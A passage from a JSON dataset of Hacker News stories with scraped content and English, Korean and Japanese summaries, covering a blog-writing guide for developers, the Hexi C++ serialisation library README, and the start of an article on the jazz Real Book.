    "content": "How to Write Blog Posts that Developers Readby Michael Lynch, published\nMarch 27, 2025if(window.location.pathname===\"/chapters/nine-years-of-blogging/\"){const e=\"What I Learned from Nine Years of Blogging\";document.title=e,document.querySelector(\"h1\").textContent=e}I recently spoke to a developer who tried blogging but gave up because nobody was reading his posts. I checked out his blog, and it was immediately obvious why he didn’t have any readers.The developer had interesting insights, but he made so many mistakes in presenting his ideas that he was driving everyone away. The tragedy was that these errors were easy to fix. Once you learn to recognize them, they feel obvious, but some bloggers make these mistakes for years.I know because I’m one of them.I’ve been blogging about software development for nine years. My best posts have reached 300k+ readers, but many of them flopped, especially in my first few years.Over time, I’ve learned techniques that help some blog posts succeed and the pitfalls that cause others to languish in obscurity.Why listen to me?Get to the pointThink one degree biggerPlan the route to your readersShow more picturesAccommodate skimmersWhy listen to me?🔗I’m going to say a bunch of gloaty things to establish credibility, but it feels gross, so let’s just get it out of the way:I’ve written a software blog for nine years, and it attracts 300k-500k unique readers per year.My posts have reached the front page of Hacker News over 30 times, many of them reaching the #1 spot.According to a ranking system I made up, I have the 48th most popular personal blog on Hacker News.I launched a successful indie business by writing a popular blog post about my product.My articles frequently appear on reddit and Lobsters.My software blog receives 300k-500k unique readers per year.I don’t claim to be the world’s best software blogger, but I’ve had enough success and experience to share some useful lessons.Get to the point🔗The biggest mistake software bloggers make is meandering.Often, the author has some valuable insight to share, but they squander their first seven paragraphs on the history of functional programming and a trip they took to Bell Labs in 1973. By the time they get to the part that’s actually interesting, everyone has long since closed the browser tab.Internet attention spans are short. If you dawdle before making your point, the reader will seek out one of the literally billions of other articles they could be reading instead.So, how do you convince the reader to stay and continue reading your blog post?When the reader arrives, they’re trying to answer two questions as quickly as possible:Did the author write this article for someone like me?How will I benefit from reading it?Give yourself the title plus your first three sentences to answer both questions. If you find yourself in paragraph two and you haven’t answered either question, you’re in trouble.To show the reader you’re writing for them, mention topics they care about, and use terminology they recognize. If you throw out jargon or unfamiliar concepts, the reader assumes the article isn’t meant for them and clicks away.Your introduction should also make it clear to the reader how the article will benefit them. There are many possible benefits you can offer:A technique the reader can apply in their work or personal life.A clear explanation of a concept that impacts the reader’s work or personal life.An insight that gives the reader a better understanding of a particular technology or industry.An interesting story that resonates with the reader.Example: “if got, want: A Simple Way to Write Better Go Tests”🔗I recently wrote an article about improving tests when using the Go programming language.Here’s the title and first paragraph:if got, want: A Simple Way to Write Better Go TestsThere’s an excellent Go testing pattern that too few people know. I can teach it to you in 30 seconds.This article immediately answers the two questions:Did the author write the article for someone like me?The article is for Go developers.What’s the benefit of reading it?You’ll learn a new testing technique in 30 seconds.Think one degree bigger🔗When you write an article, you hopefully have a type of reader in mind. For example, if you wrote an article called “Debugging Memory Leaks in Java,” you probably assumed that the reader is an intermediate to advanced Java developer.Most software bloggers never think to ask, “Is there a wider audience for this topic?”For example, “intermediate to advanced Java developers” are a subset of “Java developers,” who are a subset of “programmers,” who are a subset of “people who read blog posts.”If you wrote an article for intermediate and advanced Java developers, how much would have to change for the article to appeal to Java developers of any experience level?Often, the change is just an extra sentence or two early in the article to introduce a concept or replace jargon with more accessible terms.Jeff: Sony has a futuristic sci-fi movie they’re looking to make.Nick: Cigarettes in space?Jeff: It’s the final frontier, Nick.Nick: But wouldn’t they blow up in an all-oxygen environment?Jeff: Probably. But it’s an easy fix. One line of dialogue. “Thank God we invented the… you know, whatever device.”Thank You for Smoking (2005)The set of all Java developers is about 10x larger than the set of intermediate and advanced Java developers. That means small tweaks can expand the reach of your article by an order of magnitude.Obviously, you can’t broaden every article, and you can’t keep broadening your audience forever. No matter how well you explain background concepts, your tax accountant will never read an article about memory leaks in Java. The point isn’t to write articles that appeal to every possible reader but to notice opportunities to reach a larger audience.Example: “How I Stole Your Siacoin”🔗One of my earliest successes in blogging was an article called “How I Stole Your Siacoin.” It was about a time I stole a reddit user’s cryptocurrency (for noble reasons, I promise).Initially, I thought the story would resonate with the few hundred people who followed a niche cryptocurrency called Siacoin. As I was editing the article, I realized that you didn’t have to know anything about Siacoin to understand my story. I revised it slightly so it would make sense to cryptocurrency enthusiasts who had never heard of Siacoin.Then, I realized I could even explain this story to people who knew nothing about cryptocurrency. I adjusted the terminology to use regular-person terms like “wallet” and “passphrase” and avoided crypto-specific terms like “blockchain” or “Merkle tree.”The article was my first ever hit. It became the most popular story of all time not only on the /r/siacoin subreddit but also on the larger /r/cryptocurrency subreddit. It reached the front page of Hacker News, even though readers there are generally hostile to cryptocurrency-focused stories.“How I Stole Your Siacoin” only needed a few tweaks to be enjoyable for people who didn’t know anything about cryptocurrency.Plan the route to your readers🔗Suppose you wrote the greatest beginner’s tutorial imaginable for the Python programming language. Both your five-year-old nephew and 80-year-old dentist blazed through it with ease and delight. Everyone who reads your tutorial goes on to become a Python core contributor.Bad news: nobody will ever read your Python tutorial.“Lies!” you shout. “Thousands of developers learn Python every year. Why wouldn’t my objectively awesome tutorial become popular?”Well, think it through. What happens after you hit publish? How does anyone find your article?You’re probably thinking: Google.Yes, your friend Google will index your tutorial and use its secret Google magic to identify your article’s superior quality. Before you know it, your tutorial will be the top result for python tutorial.Except that can’t happen because there are so many Python tutorials out there already on sites that Google prefers over yours. You’ll never even make it to the first page of results.It’s nearly impossible for a new blog post to rank well in Google for the search term python tutorial.Okay, so you’ll submit your Python tutorial to reddit. The /r/python subreddit has over 1.3 million subscribers. If even 5% of them read your article, that’s a huge audience:The /r/python subreddit has over 1.3 million subscribers.Whoops! /r/python only accepts text posts, not external links, so you can’t post your tutorial there.The /r/python subreddit disables the option to submit external links.Fine, then you’ll submit it to Hacker News. They accept anything and let their members decide what’s interesting. Surely, they’ll recognize the quality of your work!Nope, it will flop there, too. Hacker News doesn’t like tutorials, especially for mainstream technologies like Python.You can try sharing your tutorial by tweeting it, skeeting it, or tooting it, but unless you already have a massive following on social media, that won’t reach a critical mass either.So, what’s the answer? How do you get people to read your amazing Python tutorial?The answer is that you don’t write a beginner’s Python tutorial.You need a realistic path to your readers🔗If you want people to read your blog, choose topics that have a clear path to your readers. Before you begin writing, think through how readers will find your post.Questions to ask when considering an article topicIs it realistic for readers to find you via Google search?Are there already 500 articles about the same topic from more established websites?What keywords would your target reader search? Try searching those keywords, and see whether there are already relevant results from well-known domains.If you’re going to submit it to a link aggregator like Hacker News or Lobsters, how often do posts like yours succeed there?If you’re going to share it on a subreddit or niche forum, does it have any chance there?Does the forum accept links to blog posts?The bigger the community, the stricter the rules tend to be about external links and self-promotion.Do blog posts like yours ever succeed there?Is the community still active?The best plan is to give your post multiple chances to succeed. If you’re betting everything on Google bubbling your post to the top, it could take months or years for you to find out if you succeeded. If you’re relying on Hacker News or reddit to tell you whether your article is worth reading, they’re going to break your heart a lot.Example: “Using Zig to Unit Test a C Application”🔗In 2023, I wrote an article called “Using Zig to Unit Test a C Application.” It was about using a new low-level language called Zig to write tests for legacy C code.Before I wrote the article, I knew that there were several places where I could share it. By luck, they all worked out:Hacker News is extremely friendly to Zig content, so my article reached the #7 spot on the front page.Lobsters is extremely friendly to Zig content, so my article was one of the top links of the day.Google bubbled my article to the top result for the keywords zig unit testing c.It’s actually even a top result for just zig unit testing because there aren’t many articles about the topic.The /r/Zig subreddit accepts links to blog posts, even if they’re self-promotion, so my post reached the top spot in that subreddit.Ziggit is a niche forum that’s welcoming to Zig-related articles, so my post received 1,000 views from Ziggit.Show more pictures🔗The biggest bang-for-your-buck change you can make to a blog post is adding pictures.If your article features long stretches of text, think about whether there’s any photo, screenshot, graph, or diagram that could make the post more visually interesting.If you’re talking about a program with a graphical interface, show screenshots.If you’re talking about an improvement in metrics like app performance or active users, show graphs.If you’re writing about your server getting overloaded, show a screenshot of what that looked like in your dashboard or email alerts.If you’re explaining a difficult concept, draw a diagram.I hire illustrators for most of my posts (including this one). I typically pay $50-100 per illustration. For simple diagrams like the nested circle sketches above, I use Excalidraw, which is free and open-source.You can also use free stock photos and AI-generated images, as they’re better than nothing, but they’re worse than anything else, including terrible MS Paint drawings.Even a terrible MS Paint drawing is more interesting than an AI-generated image.Accommodate skimmers🔗Many readers skim an article first to decide if it’s worth reading. Dazzle those readers during the skim.If the reader only saw your headings and images, would it pique their interest?The worst thing for a skimmer to see is a wall of text: long paragraphs with no images or headings to break them up. Just text, text, text all the way down.Tool: Read like a skimmer🔗Here’s a JavaScript bookmarklet that you can use to see what your article looks like with just headings and images.Skimmify pageDrag the link to your browser bookmark bar, and then click it to see what your article looks like to skimmers.Example: Boring structure vs. interesting structure🔗I wrote my article, “End-to-End Testing Web Apps: The Painless Way,” in 2019, before I thought about structure.If you skim the article, does it make you want to read the full version?\nYour browser does not support the video tag.Probably not. The headings don’t reveal much about the content, and the visuals are confusing.Consider my more recent article, “I Regret My $46k Website Redesign.”\nYour browser does not support the video tag.If you skim that article, you still see the bones of a good story, and there are interesting visual elements to draw the reader in.One of those articles barely attracted any readers, and the other became one of the most popular articles I ever published, attracting 150k unique readers in its first week. Can you guess which is which?.campaign-progress{background-color:#fdfffa;padding:1rem;border-radius:6px;text-align:center;border:1px solid #dae8c6;width:90%;max-width:500px;margin-left:auto;margin-right:auto}.goal-amount{font-weight:500;margin-bottom:1rem}.countdown{color:#555;font-size:1.1em}.progress{height:40px}.progress-bar{font-size:1.1em;line-height:40px}Pre-order the bookThis is an excerpt from my upcoming book,\nRefactoring English: Effective Writing for Software Developers.$4,776 raised of $5,000\ngoal96%Time left to meet goal: 2 days, 1 hours, 38 minutesWant to fund this so I can write the full book? Pre-order the book on\nKickstarter to support the book.Pre-Order Nowconst currentAmount=4776,goalAmount=5e3;function updateFundingInfo(){document.getElementById(\"current-amount\").textContent=currentAmount.toLocaleString(),document.getElementById(\"goal-amount\").textContent=goalAmount.toLocaleString();const t=Math.round(currentAmount/goalAmount*100),e=document.getElementById(\"progress-bar\");e.style.width=t+\"%\",e.textContent=t+\"%\",e.setAttribute(\"aria-valuenow\",currentAmount)}function updateCountdown(){const t=new Date(\"2025-03-31T23:59:00-04:00\"),n=new Date,e=t-n;if(e<=0){document.getElementById(\"countdown\").textContent=\"Campaign ended\";return}const s=Math.floor(e/(1e3*60*60*24)),o=Math.floor(e%(1e3*60*60*24)/(1e3*60*60)),i=Math.floor(e%(1e3*60*60)/(1e3*60));document.getElementById(\"countdown\").textContent=`${s} days, ${o} hours, ${i} minutes`}updateFundingInfo(),updateCountdown()In the nine years I've been blogging about software development, some of my posts have hit 300k+ readers, while others flopped, especially early on. I'm sharing all the lessons I learned the hard way about how to write popular blog posts for developers. https://t.co/a5cLF4MXfF— Michael Lynch (@deliberatecoder) March 27, 2025“Not Quite How Developers Read” illustration by Piotr Letachowicz. Steve Jobs illustration by Loraine Yow.",
    "summary": {
      "en": "**Summary of \"How to Write Blog Posts that Developers Read\" by Michael Lynch**\n\nMichael Lynch shares insights from his nine years of blogging about software development, emphasizing common mistakes that can prevent developers from gaining readers. Here are the key points:\n\n1. **Get to the Point**: Start with your main idea within the first few sentences. Readers have short attention spans and want to quickly know if the article is relevant to them and what they'll gain from reading it.\n\n2. **Think Broadly**: Consider if your topic can appeal to a wider audience. Small changes in terminology or explanations can make your content accessible to more readers.\n\n3. **Plan for Visibility**: Before writing, think about how readers will discover your post. Avoid topics that are overly saturated and ensure there are clear paths for readers to find your article, such as through Google searches or social media.\n\n4. **Use Visuals**: Adding images, diagrams, or screenshots can significantly enhance your article and make it more engaging.\n\n5. **Accommodate Skimmers**: Many readers skim articles first. Make sure your headings and images are compelling enough to draw them in, and avoid long blocks of text.\n\nBy applying these strategies, bloggers can improve their chances of attracting and retaining readers in the competitive world of software development writing.",
      "ko": "마이클 린치는 소프트웨어 개발에 관한 블로그를 9년 동안 운영하며 얻은 통찰을 공유합니다. 그는 개발자들이 독자를 확보하는 데 방해가 되는 일반적인 실수들을 강조합니다. \n\n첫 번째로, 주제를 명확히 전달하는 것이 중요합니다. 글의 첫 몇 문장 안에 핵심 아이디어를 제시해야 합니다. 독자들은 집중력이 짧기 때문에, 글이 자신에게 어떤 의미가 있는지 빠르게 파악하고 싶어합니다.\n\n두 번째로, 주제를 넓게 생각해보아야 합니다. 자신의 주제가 더 많은 독자에게 어필할 수 있는지 고민해보세요. 용어나 설명에서 작은 변화만으로도 더 많은 독자가 접근할 수 있는 콘텐츠를 만들 수 있습니다.\n\n세 번째로, 가시성을 계획해야 합니다. 글을 쓰기 전에 독자들이 어떻게 당신의 포스트를 발견할지를 생각해보세요. 지나치게 포화된 주제를 피하고, 구글 검색이나 소셜 미디어를 통해 독자가 쉽게 찾을 수 있는 경로를 마련해야 합니다.\n\n네 번째로, 시각 자료를 활용하는 것이 좋습니다. 이미지, 도표, 스크린샷 등을 추가하면 글이 훨씬 더 매력적이고 흥미롭게 변할 수 있습니다.\n\n마지막으로, 스키머를 고려해야 합니다. 많은 독자들이 글을 처음에 훑어보는 경향이 있습니다. 제목과 이미지가 충분히 매력적이어야 독자들을 끌어들일 수 있으며, 긴 문단은 피하는 것이 좋습니다.\n\n이러한 전략을 적용하면 블로거들은 소프트웨어 개발 글쓰기의 경쟁이 치열한 세계에서 독자를 유치하고 유지할 가능성을 높일 수 있습니다.",
      "ja": "マイケル・リンチは、ソフトウェア開発に関するブログを9年間続けてきた経験から、開発者が読者を獲得する際の一般的な間違いについての洞察を共有しています。重要なポイントは以下の通りです。\n\nまず、記事の冒頭で主なアイデアを伝えることが大切です。読者は注意力が短く、記事が自分にとって関連性があるか、何を得られるかをすぐに知りたいと思っています。\n\n次に、トピックがより広い読者層にアピールできるかを考えることが重要です。用語や説明を少し変えるだけで、より多くの読者に内容を理解してもらえるようになります。\n\nまた、記事を書く前に、読者がどのようにしてあなたの投稿を見つけるかを考える必要があります。過度に飽和したトピックは避け、Google検索やソーシャルメディアを通じて読者が記事にアクセスできる明確な道筋を確保しましょう。\n\n視覚的要素の活用も効果的です。画像や図、スクリーンショットを追加することで、記事がより魅力的になり、読者の関心を引きやすくなります。\n\n最後に、多くの読者は記事をざっと流し読みするため、見出しや画像が魅力的であることが重要です。長い文章の塊は避け、読みやすさを心がけましょう。\n\nこれらの戦略を実践することで、ブログを書いている人は、競争の激しいソフトウェア開発の執筆の世界で読者を引きつけ、維持する可能性を高めることができます。"
    }
  },
  {
    "id": "f9d177a202e349e0",
    "title": {
      "en": "Show HN: Hexi – Modern header-only network binary serialisation for C++",
      "ko": "헤시: C++를 위한 현대적 네트워크 직렬화",
      "ja": "Hexi: C++の新時代バイナリ"
    },
    "type": "story",
    "url": "https://github.com/EmberEmu/Hexi",
    "score": 113,
    "by": "Chaosvex",
    "time": 1743183462,
    "content": "Hexi is a lightweight, header-only C++23 library for safely handling binary data from arbitrary sources (but primarily network data). It sits somewhere between manually memcpying bytes from network buffers and full-blown serialisation libraries.\nThe design goals are ease of use, safety when dealing with untrusted data, a reasonable level of flexibility, and keeping overhead to a minimum.\nWhat Hexi doesn't offer: versioning, conversion between different formats, handling of text-based formats, unloading the dishwasher.\nHexi is dual-licensed under MIT and Apache License, Version 2.0. This means you can use Hexi under the license you prefer.\n\nIncorporating Hexi into your project is simple! The easiest way is to simply copy hexi.h from single_include into your own project. If you'd rather only include what you use, you can add include to your include paths or incorporate it into your own CMake project with target_link_library. To build the unit tests, run CMake with ENABLE_TESTING.\nHere's what some libraries might call a very simple motivating example:\n#include <hexi.h>\n#include <array>\n#include <vector>\n#include <cstddef>\n\nstruct UserPacket {\n    uint64_t user_id;\n    uint64_t timestamp;\n    std::array<uint8_t, 16> ipv6;\n};\n\nauto deserialise(std::span<const char> network_buffer) {\n    hexi::buffer_adaptor adaptor(network_buffer); // wrap the buffer\n    hexi::binary_stream stream(adaptor);          // create a binary stream\n\n    // deserialise!\n    UserPacket packet;\n    stream >> packet;\n    return packet;\n}\n\nauto serialise(const UserPacket& packet) {\n    std::vector<uint8_t> buffer;\n    hexi::buffer_adaptor adaptor(buffer); // wrap the buffer\n    hexi::binary_stream stream(adaptor);  // create a binary stream\n\n    // serialise!\n    stream << packet;\n    return buffer;\n}\n\nBy default, Hexi will try to serialise basic structures such as our UserPacket if they meet requirements for being safe to directly copy the bytes. Now, for reasons of portability, it's not recommended that you do things this way unless you're positive that the data layout is identical on the system that wrote the data. Not to worry, this is easily solved. Plus, we didn't do any error handling. All in good time.\n\nThe two classes you'll primarily deal with are buffer_adaptor and binary_stream.\nbinary_stream takes a container as its argument and is used to do the reading and writing. It doesn't know much about the details of the underlying container.\nTo support containers that weren't written to be used with Hexi, buffer_adaptor is used as a wrapper that binary_stream can interface with. As with binary_stream, it also provides read and write operations but at a lower level.\nbuffer_adaptor can wrap any contiguous container or view that provides data and size member functions and optionally resize() for write support. From the standard library, that means the following can be used out of the box:\n\n std::array\n std::span\n std::string_view\n std::string\n std::vector\n\nPlenty of non-standard library containers will work out of the box, too, as long as they provide a vaguely similar API.\nThe container's value type must be a byte type (e.g. char, std::byte, uint8_t). std::as_bytes can be used as a workaround if this poses a problem.\n\nHexi supports custom containers, including non-contiguous containers. In fact, there's a non-contiguous container included in the library. You simply need to provide a few functions such as read and size to allow the binary_stream class to be able to use it.\nstatic_buffer.h provides a simple example of a custom container that can be used directly with binary_stream.\n\nAs mentioned, Hexi is intended to be safe to use even when dealing with untrusted data. An example might be network messages that have been manipulated to try to trick your code into reading out of bounds.\nbinary_stream performs bounds checking to ensure that it will never read more data than the buffer has available and optionally allows you to specify an upper bound on the amount of data to read. This can be useful when you have multiple messages in a buffer and want to limit the deserialisation from potentially eating into the next.\nbuffer_t buffer;\n// ... read data\nhexi::binary_stream stream(buffer, 32); // will never read more than 32 bytes\n\nThe default error handling mechanism is exceptions. Upon encountering a problem with reading data, an exception derived from hexi::exception will be thrown. These are:\n\nhexi::buffer_underrun - attempt to read out of bounds\nhexi::stream_read_limit - attempt to read more than the imposed limit\n\nExceptions from binary_stream can be disabled by specifying no_throw as a template argument, as shown:\nhexi::binary_stream<buf_type, hexi::no_throw> stream(...);\n\nWhile this prevents binary_stream itself from throwing, it does not prevent propagation of exceptions from lower levels. For example, a wrapped std::vector could still throw std::bad_alloc if allocation fails when writing to it.\nRegardless of the error handling mechanism you use, the state of a binary_stream can be checked as follows:\nhexi::binary_stream<buf_type, hexi::no_throw> stream(...);\n// ... assume an error happens\n\n// simplest way to check whether any errors have occurred\nif (!stream) {\n    // handle error\n}\n\n// or we can get the state\nif (auto state = stream.state(); state != hexi::stream_state::ok) {\n    // handle error\n}\n\nIn the first example, reading our UserPacket would only work as expected if the program that wrote the data laid everything out in the same way as our own program.\nThis might not be the case for reasons of architecture differences, compiler flags, etc.\nHere's the same example but doing it portably.\n#include <hexi.h>\n#include <span>\n#include <string>\n#include <vector>\n#include <cstddef>\n#include <cstdint>\n\nstruct UserPacket {\n    uint64_t user_id;\n    std::string username;\n    uint64_t timestamp;\n    uint8_t has_optional_field;\n    uint32_t optional_field;  // pretend this is big endian in the protocol\n\n    // deserialise\n    auto& operator>>(auto& stream) {\n        stream >> user_id >> username >> timestamp >> has_optional_field;\n\n        if (has_optional_field) {\n            stream >> optional_field;\n            hexi::endian::big_to_native_inplace(optional_field);\n        }\n\n        // we can manually trigger an error if something went wrong\n        // stream.set_error_state();\n        return stream;\n    }\n\n    // serialise\n    auto& operator<<(auto& stream) const {\n        stream << user_id << username << timestamp << has_optional_field;\n\n        if (has_optional_field) {\n            stream << hexi::endian::native_to_big(optional_field);\n        }\n\n        return stream;\n    }\n};\n\n// pretend we're reading network data\nvoid read() {\n    std::vector<char> buffer;\n    const auto bytes_read = socket.read(buffer);\n\n    // ... logic for determining packet type, etc\n\n    bool result {};\n\n    switch (packet_type) {\n        case packet_type::user_packet:\n            result = handle_user_packet(buffer);\n            break;\n    }\n\n    // ... handle result\n}\n\nauto handle_user_packet(std::span<const char> buffer) {\n    hexi::buffer_adaptor adaptor(buffer);\n    hexi::binary_stream stream(adaptor);\n\n    UserPacket packet;\n    stream >> packet;\n\n    if (stream) {\n        // ... do something with the packet\n        return true;\n    } else {\n        return false;\n    }\n}\n\nBecause binary_stream is a template, it's easiest to allow the compiler to perform type deduction magic.\nIf you want the function bodies to be in a source file, it's recommended that you provide your own using alias for your binary_stream type.\nThe alternative is to use the polymorphic equivalents, pmc::buffer_adaptor and pmc::binary_stream, which allow you to change the underlying buffer type at runtime but at the cost of virtual call overhead and lacking some functionality that doesn't mesh well with polymorphism.\nHow you structure your code is up to you, this is just one way of doing it.\n\nWhen using binary_stream, strings are always treated as null-terminated. Writing a char*, std::string_view or std::string will always write a terminating byte to the stream. If you require otherwise, use one of the put functions.\nLikewise, reading to std::string assumes the buffer contains a null-terminator. If it does not, an empty string will be returned. If you know the length of the string or need to support a custom terminating/sentinel value, use get() and find_first_of().\n\nHere's a very quick rundown on some of the included extras.\n\nhexi::file_buffer\n\nFor dealing with binary files. Simples.\n\nhexi::static_buffer\n\nFixed-size networking buffer for when you know the upper bound on the amount of data you'll need to send or receive in one go. Essentially a wrapper around std::array but with added state tracking. Handy if you need to deserialise in multiple steps (read packet header, dispatch, read packet body).\n\nhexi::dynamic_buffer\n\nResizeable buffer for when you want to deal with occasional large reads/writes without having to allocate the space up front. Internally, it adds additional allocations to accommodate extra data rather than requesting a larger allocation and copying data as std::vector would. It reuses allocated blocks where possible and has support for Asio (Boost or standalone). Effectively, it's a linked list buffer.\n\nhexi::tls_block_allocator\n\nAllows many instances of dynamic_buffer to share a larger pool of pre-allocated memory, with each thread having its own pool. This is useful when you have many network sockets to handle and want to avoid the general purpose allocator. The caveat is that a deallocation must be made by the same thread that made the allocation, thus limiting access to the buffer to a single thread (with some exceptions).\n\nhexi::endian\n\nProvides functionality for handling endianness of integral types.\n\nWe're at the end of the overview, but there's more to discover if you decide to give Hexi a shot. Here's a selection of tasty morsels:\n\nbinary_stream allows you to perform write seeking within the stream, when the underlying buffer supports it. This is nice if, for example, you need to update a message header with information that you might not know until the rest of the message has been written; checksums, sizes, etc.\nbinary_stream provides overloaded put and get member functions, which allow for fine-grained control, such as reading/writing a specific number of bytes.\nbinary_stream allows for writing to std::string_view and std::span with view() and span() as long as the underlying container is contiguous. This allows you to create views into the buffer's data, providing a fast, zero-copy way to read strings and arrays from the stream. If you do this, you should avoid writing to the same buffer while holding views to the data.\nbuffer_adaptor provides a template option, space_optimise. This is enabled by default and allows it to avoid resizing containers in cases where all data has been read by the stream. Disabling it allows for preserving data even after having been read. This option is only relevant in scenarios where a single buffer is being both written to and read from.\nbuffer_adaptor provides find_first_of, making it easy to find a specific sentinel value within your buffer.\n\nTo learn more, check out the examples in docs/examples!",
    "summary": {
      "en": "Hexi is a lightweight C++23 library designed for safely handling binary data, mainly from network sources. It aims to be easy to use, flexible, and efficient, without offering features like versioning or text format handling. Hexi is available under both the MIT and Apache 2.0 licenses.\n\nTo use Hexi, simply include the `hexi.h` header in your project. It includes two main classes: `buffer_adaptor` and `binary_stream`. The `binary_stream` class is used for reading and writing binary data, while `buffer_adaptor` wraps data containers to be compatible with `binary_stream`. It supports standard containers like `std::array`, `std::vector`, and others.\n\nHexi prioritizes safety when working with untrusted data, performing bounds checks to prevent reading out of bounds. Error handling is done using exceptions, which can be managed or disabled.\n\nHexi supports custom containers, and its serialization/deserialization methods can handle various data types. It also includes utilities for dealing with binary files and buffers, such as fixed-size and dynamic buffers, which are useful for network communications.\n\nFinally, Hexi provides features for managing endianness and allows for flexible data reading and writing, including string handling and buffer optimization options.\n\nFor more details and examples, refer to the documentation.",
      "ko": "Hexi는 주로 네트워크 소스에서 오는 이진 데이터를 안전하게 처리하기 위해 설계된 경량 C++23 라이브러리입니다. 사용이 간편하고 유연하며 효율적이지만, 버전 관리나 텍스트 형식 처리와 같은 기능은 제공하지 않습니다. Hexi는 MIT 라이선스와 Apache 2.0 라이선스 하에 사용할 수 있습니다.\n\nHexi를 사용하려면 프로젝트에 `hexi.h` 헤더 파일을 포함하면 됩니다. 이 라이브러리는 두 가지 주요 클래스인 `buffer_adaptor`와 `binary_stream`을 포함하고 있습니다. `binary_stream` 클래스는 이진 데이터를 읽고 쓰는 데 사용되며, `buffer_adaptor`는 데이터 컨테이너를 `binary_stream`과 호환되도록 감싸는 역할을 합니다. 이 클래스는 `std::array`, `std::vector`와 같은 표준 컨테이너를 지원합니다.\n\nHexi는 신뢰할 수 없는 데이터를 다룰 때 안전성을 우선시하며, 범위를 벗어난 읽기를 방지하기 위해 경계 검사를 수행합니다. 오류 처리는 예외를 통해 이루어지며, 이를 관리하거나 비활성화할 수 있습니다.\n\nHexi는 사용자 정의 컨테이너를 지원하며, 직렬화 및 역직렬화 방법은 다양한 데이터 유형을 처리할 수 있습니다. 또한, 네트워크 통신에 유용한 고정 크기 및 동적 버퍼와 같은 이진 파일 및 버퍼를 다루기 위한 유틸리티도 포함되어 있습니다.\n\n마지막으로, Hexi는 엔디안 관리 기능을 제공하며, 문자열 처리 및 버퍼 최적화 옵션을 포함하여 유연한 데이터 읽기 및 쓰기를 지원합니다.\n\n자세한 내용과 예제는 문서를 참조하시기 바랍니다.",
      "ja": "Hexiは、主にネットワークからのバイナリデータを安全に扱うために設計された軽量のC++23ライブラリです。使いやすさ、柔軟性、効率性を重視しており、バージョン管理やテキスト形式の処理といった機能は提供していません。HexiはMITライセンスとApache 2.0ライセンスの両方の下で利用可能です。\n\nHexiを使用するには、プロジェクトに`hexi.h`ヘッダーを含めるだけです。このライブラリには、主に2つのクラス、`buffer_adaptor`と`binary_stream`が含まれています。`binary_stream`クラスはバイナリデータの読み書きに使用され、`buffer_adaptor`はデータコンテナを`binary_stream`と互換性のある形にラップします。標準的なコンテナである`std::array`や`std::vector`などをサポートしています。\n\nHexiは、信頼できないデータを扱う際に安全性を重視しており、範囲外の読み取りを防ぐための境界チェックを行います。エラーハンドリングは例外を使用して行われ、これを管理したり無効にしたりすることができます。\n\nHexiはカスタムコンテナもサポートしており、シリアライズやデシリアライズのメソッドはさまざまなデータ型に対応しています。また、固定サイズや動的バッファなど、バイナリファイルやバッファを扱うためのユーティリティも含まれており、ネットワーク通信に役立ちます。\n\nさらに、Hexiはエンディアンネスの管理機能を提供し、文字列処理やバッファ最適化オプションを含む柔軟なデータの読み書きを可能にします。\n\n詳細や例については、ドキュメントを参照してください。"
    }
  },
  {
    "id": "7cac7b7b59826864",
    "title": {
      "en": "'Audible enclaves' could enable private listening without headphones",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://techxplore.com/news/2025-03-audible-enclaves-enable-private-headphones.html",
    "score": 12,
    "by": "PaulHoule",
    "time": 1743279276,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "be437f11a115524a",
    "title": {
      "en": "TSMC, Intel and other top chipmakers slow Japan, Malaysia expansions",
      "ko": "반도체 대기업, 일본·말레이시아 확장 지연",
      "ja": "半導体拡大鈍化"
    },
    "type": "story",
    "url": "https://asia.nikkei.com/Spotlight/Supply-Chain/TSMC-Intel-and-other-top-chipmakers-slow-Japan-Malaysia-expansions",
    "score": 33,
    "by": "pdyc",
    "time": 1743270861,
    "content": "About Nikkei AsiaAbout UsSitemapAnnouncementsAdvertise With Nikkei AsiaAbout NikkeiSupportHelp/Contact UsView Site TipsSubscriptionsIndividual SubscriptionGroup SubscriptionGift SubscriptionLegal & PrivacyTerms of UseCopyrightPrivacy & Cookie PolicyInformation Transmission",
    "summary": {
      "en": "Nikkei Asia is a news platform that provides information and updates about Asia. It offers various services, including subscriptions for individuals and groups, and gift subscriptions. The site includes sections like announcements and support, as well as legal and privacy policies. Users can also find tips for navigating the site.",
      "ko": "니케이 아시아는 아시아에 대한 정보와 업데이트를 제공하는 뉴스 플랫폼입니다. 개인 및 그룹을 위한 구독 서비스와 선물 구독 서비스 등 다양한 서비스를 제공합니다. 이 사이트에는 공지사항과 지원 섹션, 법률 및 개인정보 보호 정책도 포함되어 있습니다. 사용자들은 사이트 이용에 대한 팁도 찾아볼 수 있습니다.",
      "ja": "Nikkei Asiaは、アジアに関する情報や最新ニュースを提供するニュースプラットフォームです。個人やグループ向けの購読サービスや、ギフト購読も利用できます。サイトには、発表やサポートのセクション、法的およびプライバシーポリシーも含まれています。また、ユーザーはサイトの使い方に関するヒントも見つけることができます。"
    }
  },
  {
    "id": "81b904731d3c64d7",
    "title": {
      "en": "The Real Book (2021)",
      "ko": "진짜 책 (2021)",
      "ja": "リアルブック2021"
    },
    "type": "story",
    "url": "https://99percentinvisible.org/episode/the-real-book/",
    "score": 147,
    "by": "Tomte",
    "time": 1743179950,
    "content": "Episode 438\nThe Real Book\n\n    PlayPause\n  Click to enlarge image\n\n                    History\n\n      Category\n      History\n\n      Date\n      04.06.21\n\n    Producer\n    99pi\n\n            Add to QueueRemove from QueueDownloadTranscript\n\n                      Share on Facebook\n\n                      Share on Twitter\n\n                      Leave a Comment\n\n                Since the mid-1970s, almost every jazz musician has owned a copy of the same book. It has a peach-colored cover, a chunky, 1970s-style logo, and a black plastic binding. It’s delightfully homemade-looking—like it was printed by a bunch of teenagers at a Kinkos. And inside is the sheet music for hundreds of common jazz tunes—also known as jazz “standards”—all meticulously notated by hand. It’s called the Real Book.\n\nBut if you were going to music school in the 1970s, you couldn’t just buy a copy of the Real Book at the campus bookstore. Because the Real Book… was illegal. The world’s most popular collection of jazz music was a totally unlicensed publication. It was a self-published book created without permission from music publishers or songwriters. It was duplicated at photocopy shops and sold on street corners, out of the trunks of cars, and under the table at music stores where people used secret code words to make the exchange. The full story of how the Real Book came to be this bootleg bible of jazz is a complicated one. It’s a story about what happens when an insurgent, improvisational art form like jazz gets codified and becomes something that you can learn from a book.\nThe History of Fake Books\nBarry Kernfeld\n is a musicologist who has written a lot about the history of jazz and music piracy. Kernfeld says that long before the Real Book ever came out, jazz musicians were relying on collections of music they called fake books. Kernfeld says 